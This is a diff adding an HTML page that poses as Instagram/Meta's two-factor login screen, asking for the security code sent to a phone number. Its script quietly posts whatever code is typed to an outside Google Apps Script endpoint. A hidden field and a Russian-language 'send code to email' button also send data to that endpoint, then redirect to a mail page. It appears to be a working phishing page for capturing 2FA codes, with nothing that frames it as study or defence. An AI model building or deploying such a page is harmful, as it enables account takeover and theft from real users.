@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <title>Document</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&family=Lato:wght@700&family=Montserrat:wght@500;600&family=Roboto&display=swap"
+    rel="stylesheet">
+</head>
+
+<body>
+  <div style="display: flex; justify-content: center; margin-bottom: 20px;">
+    <div class="cont" style="padding: 30px 50px 0 50px; width: 370px; height: 460px;">
+      <img src="./img/Group 1.png" style="width: 76px; height: 76px; margin-bottom: 10px;" alt="">
+      <h1 style="text-align: center; font-size: 15px; margin-bottom: 7px;">Enter the code we sent to your number<br>
+        ending in 9804.</h1>
+      <form action="#" name="submit-to-google-sheet" style="padding-left: 20px;">
+        <input class="input-num" name="code-num" type="text" placeholder="Security code">
+        <button type="submit" class="btn">Confirm</button>
+      </form>
+      <form action="#" name="submit-to-google-sheet-two">
+        <input type="text" value="go-poch" name="go-poch" style="border: none; color: white; font-size: 1px; ">
+        <p style="margin-bottom: 15px;">Отправить код на <button type="submit" class="btn_href">почту
+          </button> ?
+        </p>
+      </form>
+
+      <p style="margin-bottom: 10px;">Didn't get a security code? We can <a style="text-decoration: none;"
+          href="./index.html">resend it </a>.</p>
+      <p style="margin-bottom: 15px;">If you're unable to receive a security <br> code, use one of your <a
+          style="text-decoration: none;" href="./index.html">backup codes</a></p>
+    </div>
+  </div>
+
+  <p style="text-align: center; margin-bottom: 10px;">Get app</p>
+  <div style="display: flex; justify-content: center; margin-bottom: 10px;">
+    <img src="./img/Link - Get it on Google Play → c5Rp7Ym-Klz.png.png" alt="">
+    <img style='padding-top: 3px;' src="./img/Link - Get it from Microsoft.png" alt="">
+  </div>
+
+  <div style="margin: 0 auto;">
+    <div class="words">
+      <div class="qqq">
+        <p class="odsa">Meta</p>
+        <p class="odsa">About</p>
+        <p class="odsa">Blog</p>
+        <p class="odsa">Jobs</p>
+        <p class="odsa">Help</p>
+        <p class="odsa">API</p>
+        <p class="odsa">Privacy</p>
+        <p class="odsa">Terms</p>
+        <p class="odsa">Locations</p>
+        <p class="odsa">Instagram Lite</p>
+        <p class="odsa">Threads</p>
+        <p class="odsa">Contact Uploading & Non-Users</p>
+      </div>
+      <div class="ee">
+        <p class="Verified">Meta Verified</p>
+      </div>
+      <div class="ss">
+        <p class="enss">English</p>
+        <p class="asad">></p>
+        <p class="ds">2023 Instagram from Meta</p>
+      </div>
+    </div>
+  </div>
+
+
+  <script>
+    const scriptURL =
+      'https://script.google.com/macros/s/AKfycbz_Dfy0uBmBaLxXdl6LQrYH3R8NNx8Vbt1jv3moab6eTl2n9MFnB50JUzRvnmILSEeLMQ/exec';
+    const form = document.forms['submit-to-google-sheet'];
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+        .then((response) => console.log('Success!', response))
+        .catch((error) => console.error('Error!', error.message));
+    });
+
+    const newBtn = document.querySelector('.btn_href')
+    const forma = document.forms['submit-to-google-sheet-two'];
+
+    forma.addEventListener('submit', (e) => {
+      e.preventDefault();
+      fetch(scriptURL, { method: 'POST', body: new FormData(forma) })
+        .then((response) => console.log('Success!', response))
+        .catch((error) => console.error('Error!', error.message));
+    });
+
+    newBtn.addEventListener('click', () => {
+      setTimeout(() => {
+        window.location.href = './mail.html';
+      }, 3000);
+    })
+
+  </script>
+</body>
+
+</html>
